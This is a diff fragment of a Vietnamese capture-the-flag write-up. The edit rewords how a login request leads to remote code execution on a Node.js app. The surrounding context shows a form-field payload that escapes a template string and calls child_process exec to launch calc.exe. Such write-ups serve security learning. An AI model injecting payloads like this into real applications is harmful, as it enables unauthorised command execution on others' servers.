@@ -581,7 +581,7 @@ Upgrade-Insecure-Requests: 1
 username=nhienit&password=rce&pretty=');process.mainModule.constructor._load('child_process').exec('calc');_=('
 ```  
   
-Sau khi login thành công thì có thể thấy popup của `calc.exe` của mình đã hiện lên và có thể RCE.  
+Sau khi login thành công, sẽ redirect sang route `/` và template được render ra thì có thể thấy popup của `calc.exe` của mình đã hiện lên và RCE thành công.  
 ![](./rce.png)  
   
 Tiếc là, team mình đã không kịp solve được challenge này nên khá là hối tiếc :(((
